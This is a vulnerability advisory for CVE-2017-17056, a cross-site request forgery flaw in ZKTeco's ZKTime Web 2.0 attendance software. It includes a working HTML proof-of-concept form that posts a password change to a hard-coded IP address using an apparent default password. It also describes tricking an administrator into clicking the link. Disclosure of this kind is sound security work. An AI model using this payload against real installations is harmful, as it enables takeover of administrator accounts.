	Request Forgery

*1. Introduction*

Vendor:                ZKTeco
Affected Product:      ZKTime Web - 2.0.1.12280
Fixed in:
Vendor Website:        https://www.zkteco.com/product/ZKTime_Web_2.0_435.html
Vulnerability Type:    Cross Site Request Forgery
Remote Exploitable:    Yes
CVE:                   CVE-2017-17056

*2. Product description*
ZKTime Web 2.0 is a cutting edge Web-based Time Attendance software,
which provided a stable communication for devices through GPRS/WAN,
hence, users can access the software anywhere by their Web Browser to
remotely manage hundreds of T&A terminals under complex network
condition (WLAN). The Application has an administrator role and
application user role.

*3. Attack Description*
The ZKTime Web Software allows the Administrator to elevate the
privileges of the application user using a 'password_change()'
function of the Modify Password component.

An Attacker takes advantage of this scenario and creates a crafted
link to add himself as an administrator to the ZKTime Web Software. He
then uses social engineering methods to trick the administrator into
click the forged http request. The request is executed and the
attacker becomes the Administrator of the ZKTime Web Software.

*4. Proof of Concept Code*
Forged HTTP Request used by the attacker:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://110.80.38.74:8060/accounts/password_change/?stamp=1511716959229"
method="POST">
      <input type="hidden" name="old&#95;password" value="xmzkteco888" />
      <input type="hidden" name="new&#95;password1" value="admin" />
      <input type="hidden" name="new&#95;password2" value="admin" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

*5. Impact*
If the vulnerability is successfully exploited than an attacker (who
would be a normal user of the web application) can escalate his
privileges and become the administrator of ZK Time Web Software.
